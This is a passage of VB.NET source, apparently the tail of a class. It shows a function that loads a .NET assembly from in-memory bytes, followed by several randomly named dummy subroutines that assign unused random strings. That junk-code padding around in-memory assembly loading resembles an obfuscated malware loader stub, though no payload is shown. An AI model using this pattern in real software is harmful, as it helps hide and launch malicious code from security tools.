            grEVIw()

            Return Reflection.Assembly.Load(assemblyData)

        End Using ' stream
        fEUYnx()

    End Function
    Public Shared Sub mjeWDq()





        Dim jWYfsu As String = "XLnMWG"

    End Sub

    Public Shared Sub VqRiaI()





        Dim KXPcTT As String = "XQmcQG"

    End Sub

    Public Shared Sub bKdACC()





        Dim pvjNNn As String = "vhKyOi"

    End Sub

    Public Shared Sub LKAZoS()





        Dim fKTohx As String = "KACsAS"

    End Sub

    Public Shared Sub grEVIw()





        Dim NZXnqQ As String = "kJJcNt"

    End Sub

    Public Shared Sub fEUYnx()





        Dim EgqbZZ As String = "BTkkOc"

    End Sub



End Class
